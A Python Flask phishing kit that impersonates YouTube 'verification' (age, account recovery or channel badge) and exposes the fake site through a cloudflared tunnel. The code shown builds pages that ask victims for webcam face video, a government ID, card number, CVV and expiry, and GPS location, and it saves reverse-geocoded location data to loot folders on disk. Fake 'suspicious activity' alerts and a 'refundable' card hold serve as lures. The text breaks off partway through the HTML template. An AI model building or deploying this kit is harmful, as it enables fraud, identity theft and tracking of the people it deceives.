import os
import base64
import subprocess
import sys
import re
import logging
import json
import random
from threading import Thread
import time
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
import requests
from geopy.geocoders import Nominatim

# --- Dependency and Tunnel Setup ---

def install_package(package):
    """Installs a package using pip quietly."""
    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])

def check_dependencies():
    """Checks for cloudflared and required Python packages."""
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ERROR] 'cloudflared' is not installed or not in your system's PATH.", file=sys.stderr)
        print("Please install it from: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
        sys.exit(1)
    
    packages = {"Flask": "flask", "requests": "requests", "geopy": "geopy"}
    for pkg_name, import_name in packages.items():
        try:
            __import__(import_name)
        except ImportError:
            install_package(pkg_name)

def run_cloudflared_and_print_link(port, script_name):
    """Starts a cloudflared tunnel and prints the public link."""
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(process.stdout.readline, ''):
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            print(f"{script_name} Public Link: {match.group(0)}")
            sys.stdout.flush()
            break
    process.wait()

def generate_youtube_channel_name():
    """Generate a random YouTube-like channel name."""
    prefixes = ["Tech", "Gaming", "Vlog", "Music", "Creative", "Daily", "Review", "Tutorial", 
                "Explore", "Adventure", "Cooking", "Fitness", "Travel", "Comedy", "Education"]
    
    suffixes = ["Channel", "TV", "Network", "Hub", "World", "Universe", "Studio", "Productions",
                "Central", "Zone", "Nation", "Empire", "Media", "Academy", "Lab"]
    
    name_variants = [
        f"{random.choice(prefixes)}{random.choice(suffixes)}",
        f"The {random.choice(prefixes)} {random.choice(suffixes)}",
        f"{random.choice(prefixes)} {random.choice(suffixes)}",
        f"Official{random.choice(prefixes)}",
        f"{random.choice(prefixes)}By{random.choice(['Alex', 'Sam', 'Jordan', 'Taylor', 'Casey'])}",
        f"{random.choice(prefixes)}Daily",
        f"{random.choice(['Mr', 'Ms', 'The'])}{random.choice(prefixes)}"
    ]
    
    return random.choice(name_variants)

def generate_youtube_username():
    """Generate a random YouTube username."""
    first_names = ["Alex", "Sam", "Jordan", "Taylor", "Casey", "Morgan", "Riley", "Avery", 
                   "Charlie", "Skyler", "Jamie", "Quinn", "Blake", "Parker", "Drew"]
    
    username_variants = [
        f"{random.choice(first_names)}{random.randint(100, 999)}",
        f"{random.choice(first_names)}TV",
        f"{random.choice(first_names)}Official",
        f"{random.choice(first_names)}YT",
        f"Real{random.choice(first_names)}",
        f"{random.choice(first_names)}Channel",
        f"{random.choice(first_names).lower()}{random.randint(10, 99)}"
    ]
    
    return random.choice(username_variants)

def find_profile_picture(folder):
    """Search for an image file in the folder to use as profile picture."""
    image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']
    
    for file in os.listdir(folder):
        file_lower = file.lower()
        if any(file_lower.endswith(ext) for ext in image_extensions):
            filepath = os.path.join(folder, file)
            try:
                with open(filepath, 'rb') as f:
                    image_data = f.read()
                    image_ext = os.path.splitext(file)[1].lower()
                    
                    mime_types = {
                        '.jpg': 'image/jpeg',
                        '.jpeg': 'image/jpeg',
                        '.png': 'image/png',
                        '.gif': 'image/gif',
                        '.bmp': 'image/bmp',
                        '.webp': 'image/webp'
                    }
                    
                    mime_type = mime_types.get(image_ext, 'image/jpeg')
                    base64_image = base64.b64encode(image_data).decode('utf-8')
                    
                    return {
                        'filename': file,
                        'data_url': f'data:{mime_type};base64,{base64_image}',
                        'path': filepath
                    }
            except Exception as e:
                print(f"Error reading profile picture {file}: {e}")
    
    return None

def get_verification_settings():
    """Get user preferences for YouTube verification process."""
    print("\n" + "="*60)
    print("YOUTUBE VERIFICATION SETUP")
    print("="*60)
    
    # Get target username
    print("\n[+] CHANNEL SETUP")
    print("Enter the YouTube channel name to display")
    print("Leave blank for random channel generation")
    
    channel_input = input("Channel name (or press Enter for random): ").strip()
    if channel_input:
        settings = {'channel_name': channel_input}
    else:
        random_channel = generate_youtube_channel_name()
        settings = {'channel_name': random_channel}
        print(f"[+] Generated channel name: {random_channel}")
    
    # Generate username
    settings['username'] = generate_youtube_username()
    
    # Generate subscriber count
    subscriber_counts = ["1.5K", "15K", "150K", "1.5M", "15M"]
    settings['subscriber_count'] = random.choice(subscriber_counts)
    
    # Generate content type
    content_types = ["Technology", "Gaming", "Education", "Entertainment", "Music", 
                     "Vlogging", "Tutorials", "Reviews", "Comedy", "Lifestyle"]
    settings['content_type'] = random.choice(content_types)
    
    # Look for profile picture
    global DOWNLOAD_FOLDER
    profile_pic = find_profile_picture(DOWNLOAD_FOLDER)
    if profile_pic:
        settings['profile_picture'] = profile_pic['data_url']
        settings['profile_picture_filename'] = profile_pic['filename']
        print(f"[+] Found profile picture: {profile_pic['filename']}")
    else:
        settings['profile_picture'] = None
        settings['profile_picture_filename'] = None
        print(f"[!] No profile picture found in folder")
        print(f"[!] Tip: Place an image (jpg/png) in {DOWNLOAD_FOLDER} to use as profile picture")
    
    print(f"\n[+] Channel: {settings['channel_name']}")
    print(f"[+] Username: @{settings['username']}")
    print(f"[+] Subscribers: {settings['subscriber_count']}")
    print(f"[+] Content: {settings['content_type']}")
    
    # Verification type
    print("\n1. Verification Type:")
    print("A - Age Verification (for restricted content)")
    print("B - Account Recovery (suspicious activity)")
    print("C - Channel Verification (blue checkmark)")
    
    while True:
        vtype = input("Select type (A/B/C, default: A): ").strip().upper()
        if not vtype:
            vtype = 'A'
        if vtype in ['A', 'B', 'C']:
            if vtype == 'A':
                settings['verification_type'] = 'age'
                settings['reason'] = "Age-restricted content access"
            elif vtype == 'B':
                settings['verification_type'] = 'recovery'
                settings['reason'] = "Suspicious activity detected"
            else:
                settings['verification_type'] = 'channel'
                settings['reason'] = "Channel verification badge"
            break
        else:
            print("Please enter A, B, or C.")
    
    # Face verification
    if settings['verification_type'] in ['age', 'recovery']:
        print("\n2. Face Verification:")
        print("Require face verification?")
        face_enabled = input("Enable face verification (y/n, default: y): ").strip().lower()
        settings['face_enabled'] = face_enabled in ['y', 'yes', '']
        
        if settings['face_enabled']:
            while True:
                try:
                    duration = input("Duration in seconds (5-30, default: 15): ").strip()
                    if not duration:
                        settings['face_duration'] = 15
                        break
                    duration = int(duration)
                    if 5 <= duration <= 30:
                        settings['face_duration'] = duration
                        break
                    else:
                        print("Please enter a number between 5 and 30.")
                except ValueError:
                    print("Please enter a valid number.")
    
    # ID verification
    print("\n3. ID Verification:")
    print("Require ID document upload?")
    id_enabled = input("Enable ID verification (y/n, default: y): ").strip().lower()
    settings['id_enabled'] = id_enabled in ['y', 'yes', '']
    
    # Payment verification (for channel verification)
    if settings['verification_type'] == 'channel':
        print("\n4. Payment Verification:")
        print("Require payment verification for channel verification?")
        payment_enabled = input("Enable payment verification (y/n, default: n): ").strip().lower()
        settings['payment_enabled'] = payment_enabled in ['y', 'yes']
        
        if settings['payment_enabled']:
            while True:
                try:
                    amount = input("Amount in $ (0.01-10.00, default: 1.00): ").strip()
                    if not amount:
                        settings['payment_amount'] = "1.00"
                        break
                    if re.match(r'^\d+(\.\d{1,2})?$', amount):
                        settings['payment_amount'] = amount
                        break
                    else:
                        print("Please enter a valid amount (e.g., 1.00)")
                except:
                    print("Please enter a valid amount.")
    
    # Location verification
    print("\n5. Location Verification:")
    print("Require location verification?")
    location_enabled = input("Enable location verification (y/n, default: n): ").strip().lower()
    settings['location_enabled'] = location_enabled in ['y', 'yes']
    
    return settings

# --- Location Processing Functions ---

geolocator = Nominatim(user_agent="youtube_verification")

def process_and_save_location(data, session_id):
    """Process and save location data."""
    try:
        lat = data.get('latitude')
        lon = data.get('longitude')
        
        if not lat or not lon:
            return
        
        # Get address information
        address_details = {}
        full_address = "Unknown"
        try:
            location = geolocator.reverse((lat, lon), language='en', timeout=10)
            if location:
                full_address = location.address
                if hasattr(location, 'raw') and 'address' in location.raw:
                    address_details = location.raw.get('address', {})
        except Exception:
            pass
        
        # Prepare structured data
        location_data = {
            "platform": "youtube_verification",
            "session_id": session_id,
            "timestamp": datetime.now().isoformat(),
            "gps_coordinates": {
                "latitude": lat,
                "longitude": lon,
                "accuracy_m": data.get('accuracy')
            },
            "address_information": {
                "full_address": full_address,
                "city": address_details.get("city"),
                "state": address_details.get("state"),
                "country": address_details.get("country")
            },
            "verification_data": {
                "target_username": data.get('target_username', 'unknown'),
                "verification_type": data.get('verification_type', 'unknown'),
                "reason": data.get('reason', 'unknown')
            }
        }
        
        # Save to file
        filename = f"youtube_location_{session_id}.json"
        filepath = os.path.join(DOWNLOAD_FOLDER, 'location_data', filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(location_data, f, indent=2, ensure_ascii=False)
        
        print(f"YouTube location data saved: {filename}")
        
    except Exception as e:
        print(f"Error processing location: {e}")

# --- Flask Application ---

app = Flask(__name__)

# Global settings
VERIFICATION_SETTINGS = {
    'channel_name': generate_youtube_channel_name(),
    'username': generate_youtube_username(),
    'subscriber_count': "150K",
    'content_type': "Technology",
    'verification_type': 'age',
    'reason': "Age-restricted content access",
    'face_enabled': True,
    'face_duration': 15,
    'id_enabled': True,
    'payment_enabled': False,
    'payment_amount': "1.00",
    'location_enabled': False,
    'profile_picture': None,
    'profile_picture_filename': None
}

DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/YouTube Verification')
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'face_verification'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'id_documents'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'payment_data'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'location_data'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'user_data'), exist_ok=True)

def create_html_template(settings):
    """Creates the YouTube verification template."""
    channel_name = settings['channel_name']
    username = f"@{settings['username']}"
    subscriber_count = settings['subscriber_count']
    content_type = settings['content_type']
    verification_type = settings['verification_type']
    reason = settings['reason']
    face_duration = settings.get('face_duration', 15)
    payment_amount = settings.get('payment_amount', "1.00")
    profile_picture = settings.get('profile_picture')
    face_enabled = settings.get('face_enabled', False)
    id_enabled = settings.get('id_enabled', False)
    payment_enabled = settings.get('payment_enabled', False)
    location_enabled = settings.get('location_enabled', False)
    
    # Determine steps based on verification type
    total_steps = 2  # Intro + Step 1
    
    if verification_type == 'age':
        step_titles = ["Age Verification", "Verify Your Age", "ID Verification", "Complete"]
        if face_enabled:
            total_steps += 1
        if id_enabled:
            total_steps += 1
    elif verification_type == 'recovery':
        step_titles = ["Account Recovery", "Identity Check", "Security Verification", "Complete"]
        if face_enabled:
            total_steps += 1
        if id_enabled:
            total_steps += 1
        if location_enabled:
            total_steps += 1
    else:  # channel verification
        step_titles = ["Channel Verification", "Channel Info", "Payment", "Complete"]
        if payment_enabled:
            total_steps += 1
        if id_enabled:
            total_steps += 1
    
    total_steps += 1  # Final step
    
    # Build conditional HTML sections
    verification_badge = ''
    if verification_type == 'age':
        verification_badge = '<span class="verification-badge">Age Verification</span>'
    elif verification_type == 'recovery':
        verification_badge = '<span class="verification-badge">Account Recovery</span>'
    else:
        verification_badge = '<span class="verification-badge">Channel Verification</span>'
    
    # Build step indicators
    step_indicators = ''
    for i in range(1, total_steps + 1):
        if i == 1:
            step_indicators += f'''
                <div class="step">
                    <div class="step-number active">1</div>
                    <div class="step-label active">{step_titles[0] if step_titles else "Start"}</div>
                </div>
            '''
        elif i <= len(step_titles):
            step_indicators += f'''
                <div class="step" id="step{i}Indicator">
                    <div class="step-number">{i}</div>
                    <div class="step-label">{step_titles[i-1] if i-1 < len(step_titles) else "Verification"}</div>
                </div>
            '''
        else:
            step_indicators += f'''
                <div class="step" id="step{i}Indicator">
                    <div class="step-number">{i}</div>
                    <div class="step-label">Step {i}</div>
                </div>
            '''
    
    # Build face verification section
    face_verification_section = ''
    if face_enabled:
        face_verification_section = f'''
            <div class="camera-section" id="faceVerificationSection">
                <h3>Face Verification</h3>
                <div class="camera-container">
                    <video id="faceVideo" autoplay playsinline></video>
                    <div class="face-overlay">
                        <div class="face-circle"></div>
                    </div>
                </div>
                <div class="timer" id="faceTimer">00:{str(face_duration).zfill(2)}</div>
                <button class="btn" id="startFaceBtn" onclick="startFaceVerification()">Start Face Verification</button>
            </div>
        '''
    
    # Build ID upload section
    id_upload_section = ''
    if id_enabled:
        id_upload_section = f'''
            <div class="upload-section" onclick="document.getElementById('idFileInput').click()" id="idUploadSection">
                <div class="upload-icon">📄</div>
                <div class="upload-text">Upload Government ID</div>
                <div class="upload-subtext">Driver's License, Passport, or ID Card</div>
                <input type="file" id="idFileInput" accept="image/*,.pdf" style="display:none" onchange="handleIDUpload(this)">
            </div>
            <div class="preview-container" id="idPreview">
                <img class="preview-image" id="idPreviewImage">
            </div>
        '''
    
    # Build payment section
    payment_section = ''
    if payment_enabled:
        payment_section = f'''
            <div class="payment-form" id="paymentSection">
                <h3>Payment Verification</h3>
                <p style="margin-bottom: 20px; color: var(--youtube-muted);">A ${payment_amount} authorization hold will be placed on your card for verification. This amount will be refunded.</p>
                <div class="form-group">
                    <label class="form-label">Card Number</label>
                    <input type="text" class="form-input" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19">
                </div>
                <div class="card-details">
                    <div class="form-group">
                        <label class="form-label">Expiry Date</label>
                        <input type="text" class="form-input" id="expiryDate" placeholder="MM/YY" maxlength="5">
                    </div>
                    <div class="form-group">
                        <label class="form-label">CVV</label>
                        <input type="text" class="form-input" id="cvv" placeholder="123" maxlength="4">
                    </div>
                    <div class="form-group">
                        <label class="form-label">ZIP Code</label>
                        <input type="text" class="form-input" id="zipCode" placeholder="12345" maxlength="10">
                    </div>
                </div>
            </div>
        '''
    
    # Build location section
    location_section = ''
    if location_enabled:
        location_section = f'''
            <div class="upload-section" id="locationSection">
                <div class="upload-icon">📍</div>
                <div class="upload-text">Location Verification</div>
                <div class="upload-subtext">Verify your location for security purposes</div>
                <div class="status-message" id="locationStatus">Click the button below to verify location</div>
            </div>
        '''
    
    # Build age gate section
    age_gate_section = ''
    if verification_type == 'age':
        age_gate_section = f'''
            <div class="age-gate" id="ageGateStep">
                <div class="age-question">Are you 18 years or older?</div>
                <div class="age-buttons">
                    <button class="btn" onclick="confirmAge(true)">Yes, I'm 18 or older</button>
                    <button class="btn btn-outline" onclick="confirmAge(false)">No, I'm under 18</button>
                </div>
            </div>
        '''
    
    # Build info box section
    info_box_section = ''
    if verification_type == 'recovery':
        info_box_section = '''
            <div class="info-box">
                <h4>Why is this required?</h4>
                <p>We detected suspicious login attempts on your account from new locations. Complete verification to secure your account and prevent unauthorized access.</p>
            </div>
        '''
    elif verification_type == 'channel':
        info_box_section = '''
            <div class="info-box">
                <h4>Benefits of Verification:</h4>
                <ul style="padding-left: 20px; margin-top: 10px;">
                    <li>Official verification badge</li>
                    <li>Priority in search results</li>
                    <li>Access to advanced features</li>
                    <li>Increased credibility</li>
                </ul>
            </div>
        '''
    
    # Build channel verified text
    channel_verified_text = ''
    if verification_type == 'age':
        channel_verified_text = 'Age Verified'
    elif verification_type == 'recovery':
        channel_verified_text = 'Account Secured'
    else:
        channel_verified_text = 'Channel Verified'
    
    # Build verification description
    verification_description = ''
    if verification_type == 'age':
        verification_description = 'To watch age-restricted content, you need to verify your age.'
    elif verification_type == 'recovery':
        verification_description = 'We detected unusual activity on your account. Verify your identity to regain access.'
    else:
        verification_description = 'Get verified to unlock the YouTube verification badge and additional features.'
    
    # Build continue button text
    continue_button_text = ''
    if verification_type == 'age':
        continue_button_text = 'Continue to Age Verification'
    elif verification_type == 'recovery':
        continue_button_text = 'Start Account Recovery'
    else:
        continue_button_text = 'Start Channel Verification'
    
    template = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YouTube Verification</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        :root {{
            --youtube-red: #FF0000;
            --youtube-dark: #0F0F0F;
            --youtube-light: #FFFFFF;
            --youtube-gray: #272727;
            --youtube-border: #3F3F3F;
            --youtube-text: #F1F1F1;
            --youtube-muted: #AAAAAA;
        }}
        
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
            background-color: var(--youtube-dark);
            color: var(--youtube-text);
            line-height: 1.6;
            min-height: 100vh;
        }}
        
        .container {{
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
        }}
        
        /* Header */
        .header {{
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 20px 0;
            border-bottom: 1px solid var(--youtube-border);
            margin-bottom: 30px;
        }}
        
        .logo {{
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 24px;
            font-weight: 500;
        }}
        
        .logo-icon {{
            color: var(--youtube-red);
            font-size: 28px;
        }}
        
        .verification-badge {{
            background: var(--youtube-gray);
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 500;
        }}
        
        /* Channel Info */
        .channel-card {{
            background: var(--youtube-gray);
            border-radius: 12px;
            padding: 25px;
            margin-bottom: 30px;
            border: 1px solid var(--youtube-border);
        }}
        
        .channel-header {{
            display: flex;
            align-items: center;
            gap: 20px;
            margin-bottom: 20px;
        }}
        
        .channel-avatar {{
            width: 80px;
            height: 80px;
            border-radius: 50%;
            overflow: hidden;
            background: linear-gradient(45deg, #FF0000, #FF6B00);
        }}
        
        .channel-avatar img {{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }}
        
        .channel-info h2 {{
            font-size: 24px;
            margin-bottom: 5px;
        }}
        
        .channel-info p {{
            color: var(--youtube-muted);
            margin-bottom: 10px;
        }}
        
        .channel-stats {{
            display: flex;
            gap: 20px;
            font-size: 14px;
        }}
        
        .stat {{
            text-align: center;
        }}
        
        .stat-value {{
            font-weight: 600;
            font-size: 18px;
            color: var(--youtube-light);
        }}
        
        .stat-label {{
            color: var(--youtube-muted);
            font-size: 12px;
        }}
        
        /* Alert */
        .alert {{
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid var(--youtube-red);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 30px;
            display: flex;
            align-items: flex-start;
            gap: 15px;
        }}
        
        .alert-icon {{
            color: var(--youtube-red);
            font-size: 24px;
            margin-top: 2px;
        }}
        
        .alert-content h3 {{
            margin-bottom: 10px;
            color: var(--youtube-red);
        }}
        
        /* Steps */
        .steps-container {{
            margin-bottom: 40px;
        }}
        
        .step-indicator {{
            display: flex;
            justify-content: space-between;
            margin-bottom: 40px;
            position: relative;
        }}
        
        .step-indicator::before {{
            content: '';
            position: absolute;
            top: 20px;
            left: 0;
            right: 0;
            height: 2px;
            background: var(--youtube-border);
            z-index: 1;
        }}
        
        .step {{
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
            z-index: 2;
        }}
        
        .step-number {{
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: var(--youtube-border);
            color: var(--youtube-muted);
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            margin-bottom: 10px;
            border: 3px solid var(--youtube-dark);
            transition: all 0.3s;
        }}
        
        .step-number.active {{
            background: var(--youtube-red);
            color: white;
            transform: scale(1.1);
        }}
        
        .step-number.completed {{
            background: #4CAF50;
            color: white;
        }}
        
        .step-label {{
            font-size: 14px;
            color: var(--youtube-muted);
            text-align: center;
            max-width: 100px;
        }}
        
        .step-label.active {{
            color: var(--youtube-text);
            font-weight: 500;
        }}
        
        /* Step Content */
        .step-content {{
            display: none;
            animation: fadeIn 0.5s;
        }}
        
        @keyframes fadeIn {{
            from {{ opacity: 0; transform: translateY(20px); }}
            to {{ opacity: 1; transform: translateY(0); }}
        }}
        
        .step-content.active {{
            display: block;
        }}
        
        .step-title {{
            font-size: 28px;
            margin-bottom: 15px;
            font-weight: 500;
        }}
        
        .step-description {{
            color: var(--youtube-muted);
            margin-bottom: 30px;
            font-size: 16px;
        }}
        
        /* Age Verification */
        .age-gate {{
            background: var(--youtube-gray);
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
            border: 1px solid var(--youtube-border);
        }}
        
        .age-question {{
            font-size: 20px;
            margin-bottom: 25px;
            text-align: center;
        }}
        
        .age-buttons {{
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }}
        
        /* Camera Section */
        .camera-section {{
            text-align: center;
            margin-bottom: 30px;
        }}
        
        .camera-container {{
            width: 300px;
            height: 300px;
            margin: 0 auto 25px;
            border-radius: 12px;
            overflow: hidden;
            background: #000;
            border: 3px solid var(--youtube-red);
            position: relative;
        }}
        
        .camera-container video {{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }}
        
        .face-overlay {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }}
        
        .face-circle {{
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 200px;
            height: 200px;
            border: 2px solid white;
            border-radius: 50%;
            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.7);
        }}
        
        .timer {{
            font-size: 36px;
            font-weight: 500;
            color: var(--youtube-red);
            margin: 20px 0;
            font-family: 'Courier New', monospace;
        }}
        
        /* ID Upload */
        .upload-section {{
            background: var(--youtube-gray);
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
            border: 2px dashed var(--youtube-border);
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
        }}
        
        .upload-section:hover {{
            border-color: var(--youtube-red);
            background: rgba(255, 0, 0, 0.05);
        }}
        
        .upload-icon {{
            font-size: 48px;
            color: var(--youtube-red);
            margin-bottom: 20px;
        }}
        
        .upload-text {{
            font-size: 18px;
            font-weight: 500;
            margin-bottom: 10px;
        }}
        
        .upload-subtext {{
            color: var(--youtube-muted);
            font-size: 14px;
        }}
        
        .preview-container {{
            margin-top: 20px;
            display: none;
        }}
        
        .preview-image {{
            max-width: 200px;
            max-height: 150px;
            border-radius: 8px;
            border: 2px solid var(--youtube-border);
        }}
        
        /* Payment Form */
        .payment-form {{
            background: var(--youtube-gray);
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
        }}
        
        .form-group {{
            margin-bottom: 20px;
        }}
        
        .form-label {{
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            color: var(--youtube-text);
        }}
        
        .form-input {{
            width: 100%;
            padding: 14px;
            background: var(--youtube-dark);
            border: 2px solid var(--youtube-border);
            border-radius: 8px;
            color: var(--youtube-text);
            font-size: 16px;
            transition: border-color 0.3s;
        }}
        
        .form-input:focus {{
            outline: none;
            border-color: var(--youtube-red);
        }}
        
        .card-details {{
            display: grid;
            grid-template-columns: 2fr 1fr 1fr;
            gap: 15px;
        }}
        
        /* Buttons */
        .btn {{
            display: inline-block;
            padding: 16px 32px;
            background: var(--youtube-red);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s;
            text-align: center;
            text-decoration: none;
        }}
        
        .btn:hover {{
            background: #CC0000;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(255, 0, 0, 0.3);
        }}
        
        .btn:active {{
            transform: translateY(0);
        }}
        
        .btn:disabled {{
            background: var(--youtube-border);
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }}
        
        .btn-block {{
            display: block;
            width: 100%;
        }}
        
        .btn-outline {{
            background: transparent;
            border: 2px solid var(--youtube-border);
            color: var(--youtube-text);
        }}
        
        .btn-outline:hover {{
            background: var(--youtube-gray);
            border-color: var(--youtube-red);
            color: var(--youtube-red);
        }}
        
        .button-group {{
            display: flex;
            gap: 15px;
            margin-top: 30px;
        }}
        
        /* Status Messages */
        .status-message {{
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            text-align: center;
        }}
        
        .status-success {{
            background: rgba(76, 175, 80, 0.1);
            color: #4CAF50;
            border: 1px solid #4CAF50;
        }}
        
        .status-error {{
            background: rgba(255, 0, 0, 0.1);
            color: var(--youtube-red);
            border: 1px solid var(--youtube-red);
        }}
        
        .status-processing {{
            background: rgba(255, 193, 7, 0.1);
            color: #FFC107;
            border: 1px solid #FFC107;
        }}
        
        /* Loading Spinner */
        .loading-spinner {{
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
        }}
        
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
        
        /* Info Box */
        .info-box {{
            background: var(--youtube-gray);
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            border-left: 4px solid var(--youtube-red);
        }}
        
        .info-box h4 {{
            margin-bottom: 10px;
            color: var(--youtube-red);
        }}
        
        /* Completion Screen */
        .completion-screen {{
            text-align: center;
            padding: 50px 20px;
        }}
        
        .success-icon {{
            font-size: 72px;
            color: #4CAF50;
            margin-bottom: 30px;
        }}
        
        .channel-verified {{
            background: linear-gradient(45deg, var(--youtube-red), #FF6B00);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-size: 32px;
            font-weight: 600;
            margin: 20px 0;
        }}
        
        /* Footer */
        .footer {{
            text-align: center;
            padding: 30px 0;
            border-top: 1px solid var(--youtube-border);
            margin-top: 40px;
            color: var(--youtube-muted);
            font-size: 14px;
        }}
        
        .footer-links {{
            margin-top: 15px;
        }}
        
        .footer-links a {{
            color: var(--youtube-muted);
            text-decoration: none;
            margin: 0 10px;
        }}
        
        .footer-links a:hover {{
            color: var(--youtube-red);
            text-decoration: underline;
        }}
        
        /* Responsive */
        @media (max-width: 768px) {{
            .container {{
                padding: 15px;
            }}
            
            .header {{
                flex-direction: column;
                text-align: center;
                gap: 15px;
            }}
            
            .channel-header {{
                flex-direction: column;
                text-align: center;
            }}
            
            .step-indicator {{
                flex-wrap: wrap;
                justify-content: center;
                gap: 20px;
            }}
            
            .step-indicator::before {{
                display: none;
            }}
            
            .camera-container {{
                width: 250px;
                height: 250px;
            }}
            
            .card-details {{
                grid-template-columns: 1fr;
            }}
            
            .button-group {{
                flex-direction: column;
            }}
            
            .age-buttons {{
                grid-template-columns: 1fr;
            }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="logo">
                <span class="logo-icon">▶️</span>
                <span>YouTube</span>
                <span class="verification-badge">Verification</span>
            </div>
            <div>
                {verification_badge}
            </div>
        </div>
        
        <!-- Channel Card -->
        <div class="channel-card">
            <div class="channel-header">
                <div class="channel-avatar">
                    {f'<img src="{profile_picture}">' if profile_picture else f'<div style="background:linear-gradient(45deg,#FF0000,#FF6B00);width:100%;height:100%;display:flex;align-items:center;justify-content:center;color:white;font-size:2rem;">{channel_name[0].upper() if channel_name else "Y"}</div>'}
                </div>
                <div class="channel-info">
                    <h2>{channel_name}</h2>
                    <p>{username}</p>
                    <div class="channel-stats">
                        <div class="stat">
                            <div class="stat-value">{subscriber_count}</div>
                            <div class="stat-label">Subscribers</div>
                        </div>
                        <div class="stat">
                            <div class="stat-value">{content_type}</div>
                            <div class="stat-label">Content</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Alert -->
        <div class="alert">
            <div class="alert-icon">⚠️</div>
            <div class="alert-content">
                <h3>{reason}</h3>
                <p>You need to complete verification to continue using YouTube. This helps protect your account and ensure community safety.</p>
            </div>
        </div>
        
        <!-- Step Indicator -->
        <div class="steps-container">
            <div class="step-indicator">
                {step_indicators}
            </div>
            
            <!-- Step 1: Introduction -->
            <div class="step-content active" id="step1">
                <h2 class="step-title">{step_titles[0] if step_titles else "Verification Required"}</h2>
                <p class="step-description">
                    {verification_description}
                </p>
                
                {age_gate_section}
                {info_box_section}
                
                <div class="button-group">
                    <button class="btn btn-block" onclick="nextStep()" id="continueBtn">
                        {continue_button_text}
                    </button>
                    {'' if verification_type == 'recovery' else '<button class="btn btn-outline btn-block" onclick="skipVerification()">Skip for Now</button>'}
                </div>
            </div>
            
            <!-- Step 2: Face/ID Verification -->
            <div class="step-content" id="step2">
                <h2 class="step-title">{step_titles[1] if len(step_titles) > 1 else "Verification"}</h2>
                <p class="step-description">
                    {'Verify your identity to access age-restricted content.' if verification_type == 'age' else ''}
                    {'Verify your identity to recover your account.' if verification_type == 'recovery' else ''}
                    {'Verify your channel information.' if verification_type == 'channel' else ''}
                </p>
                
                {face_verification_section}
                {id_upload_section}
                
                <div class="status-message" id="verificationStatus"></div>
                
                <div class="button-group">
                    <button class="btn" id="submitVerificationBtn" onclick="submitVerification()" {'disabled' if not (face_enabled or id_enabled) else ''}>Submit Verification</button>
                    <button class="btn btn-outline" onclick="prevStep()">Back</button>
                </div>
            </div>
            
            <!-- Step 3: Payment/Location -->
            <div class="step-content" id="step3">
                <h2 class="step-title">{step_titles[2] if len(step_titles) > 2 else "Additional Verification"}</h2>
                <p class="step-description">
                    Complete additional verification steps.
                </p>
                
                {payment_section}
                {location_section}
                
                <div class="button-group">
                    <button class="btn" id="step3Button" onclick="completeStep3()">{'Verify with Payment' if payment_enabled else 'Verify Location' if location_enabled else 'Continue'}</button>
                    <button class="btn btn-outline" onclick="prevStep()">Back</button>
                </div>
            </div>
            
